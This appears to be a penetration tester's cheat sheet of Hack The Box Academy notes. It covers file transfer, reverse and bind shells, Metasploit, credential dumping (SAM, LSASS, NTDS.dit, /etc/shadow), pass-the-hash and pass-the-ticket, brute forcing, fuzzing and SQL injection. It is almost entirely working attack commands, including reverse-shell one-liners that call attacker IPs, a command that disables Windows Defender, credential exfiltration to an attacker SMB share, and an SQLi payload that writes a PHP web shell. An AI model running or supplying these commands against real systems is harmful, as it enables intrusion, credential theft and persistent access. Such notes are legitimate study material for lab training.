    - nc -l -p 8000 > SharpKatz.exe
    - ncat -l -p 8000 --recv-only > SharpKatz.exe
    - nc -q 0 192.168.49.128 8000 < SharpKatz.exe
    - ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
    - sudo nc -l -p 443 -q 0 < SharpKatz.exe
    - nc 192.168.49.128 443 > SharpKatz.exe
    - sudo ncat -l -p 443 --send-only < SharpKatz.exe
    - ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
    - sudo ncat -l -p 443 --send-only < SharpKatz.exe
    - cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
- Powershell
- RDP
    - xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
    - `\\tsclient\`

### LOTL

- [https://lolbas-project.github.io/](https://lolbas-project.github.io/)
- [https://gtfobins.github.io/](https://gtfobins.github.io/)

## Shells and payloads

- Bind shell
    - Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
    - vnk50@htb[/htb]$ nc -nv 10.129.41.200 7777
- Reverse shell
    - vnk50@htb[/htb]$ sudo nc -lvnp 443
    - powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()”
    - Diasble AV- PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
- Payloads
    - `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f`
- Payload with msfvenom
    - Stageless
        - msfvenom -l payloads
        - msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
- Payload
    - https://github.com/swisskyrepo/PayloadsAllTheThings
    - https://github.com/samratashok/nishang
- Interactive shell
    - python -c 'import pty; pty.spawn("/bin/sh")’
    - /bin/sh -i
    - perl —e 'exec "/bin/sh";’
    - ruby: exec "/bin/sh”
    - lua: os.execute('/bin/sh')
    - awk 'BEGIN {system("/bin/sh")}’
    - find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
    - find . -exec /bin/sh \; -quit
    - vim -c ':!/bin/sh’

### WebShells

- Laudanum
    - [https://github.com/jbarcia/Web-Shells/tree/master/laudanum](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)
    - /usr/share/webshells/laudanum
- Antak Webshell
    - /usr/share/nishang/Antak-WebShell
- php
    - https://github.com/WhiteWinterWolf/wwwolf-php-webshell

## Metasploit

- Modules
    - /usr/share/metasploit-framework/modules
- Plugins
    - /usr/share/metasploit-framework/plugins/
- Scripts
    - /usr/share/metasploit-framework/scripts/
- Tools
    - /usr/share/metasploit-framework/tools/
- msfconsole
    - <No.> <type>/<os>/<service>/<name>
    - search eternalromance
    - search type:exploit platform:windows cve:2021 rank:excellent microsoft
- Permanent target until restarted
    - setg RHOSTS 10.10.10.40
- Targets
    - unique operating system identifiers
    - show targets
    - info
- meterpreter
    - post exploitation ?
    - help
- Sessions
    - background or [CTRL] + [Z]
    - sessions
    - sessions -i 1
    - post category
- Jobs
    - port in use CTRL C doesnot work
    - jobs -h
    - exploit -h
    - exploit -j  :- run it in the context of a job
    - jobs -l
- meterpreter
    - show payloads
    - getuid
    - ps
    - steal token 1386
    - bg
    - search local_exploit_suggester
    - hashdump
    - lsa_dump_sam
    - lsa_dump_secrets
- MSFVenom
    - msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
    - Setting Up Multi/Handler
        - use multi/handler
    - Local Exploit Suggester

## Password attacks

- cat /etc/shadow
- john --format=<hash_type> <hash or hash_file>
- john --format=sha256 hashes_to_crack.txt
- pdf2john server_doc.pdf > server_doc.hash
- crackmapexec smb -h
- crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
- crackmapexec winrm 10.129.42.197 -u user.list -p password.list
- evil-winrm -i <target-IP> -u <username> -p <password>
- hydra -L user.list -P password.list ssh://10.129.42.197
- hydra -L user.list -P password.list rdp://10.129.42.197
- crowbar -b rdp -s xx.xxx.xxx.xxx/32 -u johanna -C <full-mutated-password-list
- hydra -L user.list -P password.list smb://10.129.42.197
- msfconsole -q
- scanner/smb/smb_login
- crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
- smbclient -U user \\\\10.129.42.197\\SHARENAME
- mutations
    - cat custom.rule
    - hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
    - hashcat.exe -a 0 password.txt -r custom.rule --stdout -D 2 -d 1
    - ls /usr/share/hashcat/rules/
    - cewl [https://www.inlanefreight.com](https://www.inlanefreight.com/) -d 4 -m 6 --lowercase -w inlane.wordlist
    - wc -l inlane.wordlist
    - Assessment
        - hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
        - Remove all passwords shorter than 10 with `sed -ri '/^.{,9}$/d' mut_password.list`
        - Take the first 7000 `head -7000 mut_password.list`
        - hydra -l sam -P ./7000mut_password.list [ftp://10.129.202.64](ftp://10.129.202.64/) -t 64
        - grep '^[A-Z]' mut_password3.list > mut_password4.list
        - B@tm@n2022!
- Password Reuse
    - hydra -C <user_pass.list> <protocol>://<IP>
    - hydra -C userpass.txt streamio.htb https-post-form “/login.php:username=^USER^&password=^PASS^:F=Login failed”
    - [https://raw.githubusercontent.com/ihebski/DefaultCreds-cheat-sheet/main/DefaultCreds-Cheat-Sheet.csv](https://raw.githubusercontent.com/ihebski/DefaultCreds-cheat-sheet/main/DefaultCreds-Cheat-Sheet.csv)
- SAM
    - Using reg.exe save to Copy Registry Hives
        - `reg.exe save hklm\\sam C:\\sam.save`
        - `reg.exe save hklm\\system C:\\system.save`
        - `reg.exe save hklm\\security C:\\security.save`
    - Creating a Share with [smbserver.py](http://smbserver.py/)
        - sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
        - move sam.save \\10.10.15.16\CompData
    - Dumping Hashes with Impacket's [secretsdump.py](http://secretsdump.py/)
        - python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
    - Crack hash with hashcat
        - txt file sudo vim hashestocrack.txt
        - crack nt hashes
        - sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
    - Remote Dumping & LSA Secrets Considerations
        - Dumping LSA Secrets Remotely
            - crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
        - Dumping SAM Remotely
            - crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
- LSASS
    - Dumping LSASS Process Memory
        - Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file
        - C:\Users\loggedonusersdirectory\AppData\Local\Temp
        - C:\Windows\system32> tasklist /svc
        - PS C:\Windows\system32> Get-Process lsass
        - PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
    - Using Pypykatz to Extract Credentials
        - pypykatz lsa minidump /home/peter/Documents/lsass.dmp
        - sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
- Attacking Active Directory & NTDS.dit
    - ./username-anarchy -i /home/ltnbob/names.txt
    - crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
    - Capturing NTDS.dit
        - evil-winrm -i 10.129.201.57 -u bwilliamson -p 'P@55w0rd!’
        - *Evil-WinRM* PS C:\> net localgroup
        - *Evil-WinRM* PS C:\> net user bwilliamson
        - *Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
        - *Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
        - *Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
        - OR
        - crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
    - crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
    - evil-winrm -i 10.129.201.57 -u Administrator -H "64f12cddaa88057e06a81b54e73b949b”
- Credential Hunting in Windows
    - C:\Users\bob\Desktop> start lazagne.exe all
    - C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
    - Passwords in Group Policy in the SYSVOL share
    - Others
        - Passwords in scripts in the SYSVOL share
        - Password in scripts on IT shares
        - Passwords in web.config files on dev machines and IT shares unattend.xml
        - Passwords in the AD user or computer description fields
        - KeePass databases --> pull hash, crack and get loads of access.
        - Found on user systems and shares
        - Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint
- Credential Hunting in Linux
    - for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
    - for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
    - for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
    - `find /home/* -type f -name "*.txt" -o ! -name "*.*"`
    - for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
    - cat /etc/crontab
    - ls -la /etc/cron.*/
    - grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1”
    - grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1”
    - for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
    - `tail -n5 /home/*/.bash*`
    - Memory and cache
        - sudo python3 [mimipenguin.py](http://mimipenguin.py/)
        - sudo bash [mimipenguin.sh](http://mimipenguin.sh/)
        - sudo python2.7 [laZagne.py](http://lazagne.py/) all
        - ls -l .mozilla/firefox/ | grep default
        - cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
        - python3.9 firefox_decrypt.py
- Passwd, shadow & opasswd
    - /etc/passwd
    - sudo cat /etc/shadow
    - sudo cat /etc/security/opasswd
    - sudo cp /etc/passwd /tmp/passwd.bak
- Cracking Linux Credentials
    - sudo cp /etc/passwd /tmp/passwd.bak
    - sudo cp /etc/shadow /tmp/shadow.bak
    - unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
    - hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
    - cat md5-hashes.list
    - hashcat -m 500 -a 0 md5-hashes.list rockyou.txt

### Pass the Hash (PtH)

- Mimikatz (Windows)
    - Module - `sekurlsa::pth`
        - /user
        - /rc4 or /NTLM
        - /domain
        - /run
    - mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
- PowerShell Invoke-TheHash (Windows)
    - Invoke-TheHash, we have two options: SMB or WMI command execution
    - Target
    - Username
    - Domain
    - Hash
    - Command
    - The following command will use the SMB method for command execution to create a new user named mark and add the user to the Administrators group.
    - Import-Module .\Invoke-TheHash.psd1
    - Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
    - Reverse Shell
        - [https://www.revshells.com/](https://www.revshells.com/)
        - Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command “<powershell>”
- Impacket (linux)
    - different operations such as Command Execution and Credential Dumping, Enumeration
    - command execution psexec
    - impacket-psexec [administrator@10.129.201.126](mailto:administrator@10.129.201.126) -hashes :30B3783CE2ABF1AF70F77D0660CF3453
    - impacket-wmiexec
    - impacket-atexec
    - impacket-smbexec
- CrackmapExec (linux)
    - crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
    - --local-auth
    - (-x) to execute commands
    - crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
- Evil-winrm
    - if smb is blocked
    - evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
    - Note: When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb
- Pass the Hash with RDP (Linux)
    - Enable Restricted Admin Mode to Allow PtH
        - c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
    - xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
- UAC Limits Pass the Hash for Local Accounts

### Pass the Ticket (PtT)

- Two types of ticket
    - Service Ticket  - TGS
    - Ticket Granting Ticket - TGT
- Harvesting Kerberos Tickets from Windows
- Mimikatz - Export Tickets
    - mimikatz.exe
    - privilege::debug
    - sekurlsa::tickets /export
    - dir *.kirbi
    - Note: At the time of writing, using Mimikatz version 2.2.0 20220919, if we run "sekurlsa::ekeys" it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in base64 format.
- Rubeus - Export Tickets
    - Rubeus.exe dump /nowrap
- Generate our own ticket
- Pass the Key or OverPass the Hash
    - Need user’s hash
    - Mimikatz - Extract Kerberos Keys
        - mimikatz.exe
        - privilege::debug
        - sekurlsa::ekeys
    - Mimikatz - Pass the Key or OverPass the Hash
        - sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
    - Rubeus - Pass the Key or OverPass the Hash
        - Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
    - Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.
    - Note: Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use a rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade.”
- Pass the Ticket (PtT)
    - Rubeus
        - Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
        - submit ticket to current logon session
        - Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
        - OR
        - PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
        - Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID<SNIP>
    - Mimikatz - Pass the Ticket
        - mimikatz.exe
        - privilege::debug
        - kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi”
        - exit
        - Note: Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module misc to launch a new command prompt window with the imported ticket using the misc::cmd command.
- Pass The Ticket with PowerShell Remoting (Windows)
    - Mimikatz - Pass the Ticket for Lateral Movement.
        - member of the Remote Management Users group
        - mimikatz.exe
        - privilege::debug
        - kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi”
        - exit
        - powershell
        - Enter-PSSession -ComputerName DC01
    - Rubeus - PowerShell Remoting with Pass the Ticket
        - Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
        - Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
- Linux
    - Linux machines store Kerberos tickets as ccache files in the /tmp directory
    - environment variable `KRB5CCNAME`
    - keytab
    - Identifying Linux and Active Directory Integration
        - realm list
        - sssd or winbind
        - ps -ef | grep -i "winbind\|sssd”
    - Finding Kerberos Tickets in Linux
    - Keytab
        - find / -name *keytab* -ls 2>/dev/null
    - Identifying Keytab Files in Cronjobs
        - crontab -l
        - kinit to import a keytab into our session and act as the user
    - Finding ccache Files
        - env | grep -i krb5
        - ls -la /tmp
    - Listing keytab File Information
        - klist -k -t
    - Impersonating a User with a keytab
        - klist
        - kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
        - klist
    - Extracting Keytab Hashes with KeyTabExtract
        - python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
    - Importing the ccache File into our Current Session
        - klist
        - cp /tmp/krb5cc_647401106_I8I133 .
        - export KRB5CCNAME=/root/krb5cc_647401106_I8I133
        - klist
    - Using Impacket with proxychains and Kerberos Authentication
        - impacket-wmiexec dc01 -k
        - Note: If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.
    - Evil-winrm
        - Installing Kerberos Authentication Package
            - sudo apt-get install krb5-user -
            - domain name: INLANEFREIGHT.HTB, and the KDC is the DC01
        - Kerberos Configuration File for INLANEFREIGHT.HTB
            - cat /etc/krb5.conf
            - `default_realm = INLANEFREIGHT.HTB`
            - `[realms]
            INLANEFREIGHT.HTB = {
            kdc = dc01.inlanefreight.htb
            }`
        - evil-winrm -i dc01 -r inlanefreight.htb
    - Impacket Ticket Converter
        - impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
    - Importing Converted Ticket into Windows Session with Rubeus
        - C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
    - Linikatz
        - wget [https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh](https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh)
        - /opt/linikatz.sh

### Protected Files

- for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
- grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1”
- cat /home/cry0l1t3/.ssh/SSH.private
- `locate *2john*`
- SSH
    - [ssh2john.py](http://ssh2john.py/) SSH.private > ssh.hash
    - john --wordlist=rockyou.txt ssh.hash
    - john ssh.hash --show
- Word
    - [office2john.py](http://office2john.py/) Protected.docx > protected-docx.hash
    - john --wordlist=rockyou.txt protected-docx.hash
- pdf
    - [pdf2john.py](http://pdf2john.py/) PDF.pdf > pdf.hash
- curl -s [https://fileinfo.com/filetypes/compressed](https://fileinfo.com/filetypes/compressed) | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
- zip
    - zip2john ZIP.zip > zip.hash
- openssl
    - for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
- Bitlocker
    - bitlocker2john -i Backup.vhd > backup.hashes
    - grep "bitlocker\$0" backup.hashes > backup.hash
    - cat backup.hash
    - hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked

## ffuf

- Wordlist
    - /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
    - (-ic) flag
- Directory fuzzing
    - ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ
    - (-t) threads
- Page fuzzing
- Extension fuzzing
    - SecLists/Discovery/Web-Content/web-extensions.txt
    - ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ
- Page Fuzzing
    - ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php
- Recursive Fuzzing
    - (-recursion-depth 1)
    - (-e .php)
    - (-v) to output url
    - ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
- Domain fuzzing
    - Sub-domain Fuzzing
        - ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u [https://FUZZ.inlanefreight.com/](https://fuzz.inlanefreight.com/)
    - Vhost fuzzing
        - ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u [http://academy.htb](http://academy.htb/):PORT/ -H 'Host: FUZZ.academy.htb'
- Filtering result
    - `-fs 900`
- Parameter Fuzzing - GET
    - ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u [http://admin.academy.htb](http://admin.academy.htb/):PORT/admin/admin.php?FUZZ=key -fs xxx
- Parameter Fuzzing - POST
    - ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u [http://admin.academy.htb](http://admin.academy.htb/):PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
- Value Fuzzing
    - for i in $(seq 1 1000); do echo $i >> ids.txt; done
    - ffuf -w ids.txt:FUZZ -u [http://admin.academy.htb](http://admin.academy.htb/):PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx

## Login Bruteforcing

- hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /
- Brute Forcing Forms
    - hydra
        - hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'”
- Personalized Wordlists
    - CUPP
    - cupp -i
- Password Policy
    
    ```xml
    `sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
    sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
    sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
    ```
    
- username-anarchy

## SQL INJECTION FUNDAMENTALS

- DESCRIBE to list table structure
- Sorting Results
    - SELECT * FROM logins ORDER BY password;
    - SELECT * FROM logins ORDER BY password DESC;
    - ASC
    - SELECT * FROM logins ORDER BY password DESC, id ASC;
- Limit result
    - SELECT * FROM logins LIMIT 2;
    - SELECT * FROM logins LIMIT 1, 2;
- Where clause
    - SELECT * FROM table_name WHERE <condition>;
    - SELECT * FROM logins WHERE id > 1;
    - SELECT * FROM logins where username = 'admin';
- Like  - pattern
    - SELECT * FROM logins WHERE username LIKE 'admin%';
    - SELECT * FROM logins WHERE username like '___';
- AND
    - SELECT 1 = 1 AND 'test' = 'test';
- OR
    - SELECT 1 = 1 OR 'test' = 'abc';
- NOT
    - SELECT NOT 1 = 1;
- AND, OR and NOT operators can also be represented as &&, || and !, respectively
- Operators in queries
    - SELECT * FROM logins WHERE username != 'john';
    - SELECT * FROM logins WHERE username != 'john' AND id > 1;
- Operator preference
    - [https://mariadb.com/kb/en/operator-precedence/](https://mariadb.com/kb/en/operator-precedence/)
- Subverting Query Logic
- SQLi Discovery
    
    
    | Payload | URL Encoded |
    | --- | --- |
    | ' | %27 |
    | " | %22 |
    | # | %23 |
    | ; | %3B |
    | ) | %29 |
- OR Injection
    - admin' or '1'='1
    - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL Injection#authentication-bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)
- Comments
    - `--` or `#`
    - need empty space after two dashes
    - `-- -`
- Union
    - SELECT * FROM ports UNION SELECT * FROM ships;
    - UNION SELECT username, 2, 3, 4 from passwords-- ‘
    - Check
        - ' order by 1-- -
        - ' order by 2-- -
        - cn' UNION select 1,2,3,4-- -
    - cn' UNION select 1,@@version,3,4-- -
- INFORMATION_SCHEMA Database
    - table SCHEMATA in the INFORMATION_SCHEMA database
    - SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
    - cn' UNION select 1,database(),2,3-- -
    - cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
    - cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
    - cn' UNION select 1, username, password, 4 from dev.credentials-- -
- Reading Files
    - FILE privilege
    - cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
    - cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
    - cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
    - cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
- Load File
    - SELECT LOAD_FILE('/etc/passwd');
    - cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
    - cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
- Writing Files
    - User with FILE privilege enabled
    - MySQL global secure_file_priv variable not enabled
    - Write access to the location we want to write to on the back-end server
    - SHOW VARIABLES LIKE 'secure_file_priv';
    - SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv”
    - cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
    - SELECT * from users INTO OUTFILE '/tmp/credentials';
    - select 'file written successfully!' into outfile '/var/www/html/proof.txt’
    - Note: To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use load_file to read the server configuration, like Apache's configuration found at /etc/apache2/apache2.conf, Nginx's configuration at /etc/nginx/nginx.conf, or IIS configuration at %WinDir%\System32\Inetsrv\Config\ApplicationHost.config, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using this wordlist for Linux or this wordlist for Windows. Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.
    - [https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
    - cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
    - cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'--

## SQLMap

- python [sqlmap.py](http://sqlmap.py/) -u '[http://inlanefreight.htb/page.php?id=5](http://inlanefreight.htb/page.php?id=5)'
- sqlmap -u "[http://www.example.com/vuln.php?id=1](http://www.example.com/vuln.php?id=1)" --batch
- Note: in this case, option '-u' is used to provide the target URL, while the switch '--batch' is used for skipping any required user-input, by automatically choosing using the default option.
- sqlmap '[http://www.example.com/?id=1](http://www.example.com/?id=1)' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
- (e.g. --crawl, --forms or -g).+
- sqlmap '[http://www.example.com/](http://www.example.com/)' --data 'uid=1&name=test'
- It will test both
- special marker * as follows:
    - sqlmap '[http://www.example.com/](http://www.example.com/)' --data 'uid=1*&name=test'
    - uid start vulnerable
- Copy request to file then `sqlmap -r req.txt`
- sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c’
- sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c’
- Attack tuning
    - Prefix and sufix
        - sqlmap -u "[www.example.com/?q=test](http://www.example.com/?q=test)" --prefix="%'))" --suffix="-- -"
- (--level and --risk)
- Database Enumeration
    - sqlmap -u "[http://www.example.com/?id=1](http://www.example.com/?id=1)" --banner --current-user --current-db --is-dba
    - sqlmap -u "[http://www.example.com/?id=1](http://www.example.com/?id=1)" --tables -D testdb
    - sqlmap -u "[http://www.example.com/?id=1](http://www.example.com/?id=1)" --dump -T users -D testdb
    - sqlmap -u "[http://www.example.com/?id=1](http://www.example.com/?id=1)" --dump -T users -D testdb -C name,surname
    - sqlmap -u "[http://www.example.com/?id=1](http://www.example.com/?id=1)" --dump -T users -D testdb --start=2 --stop=3
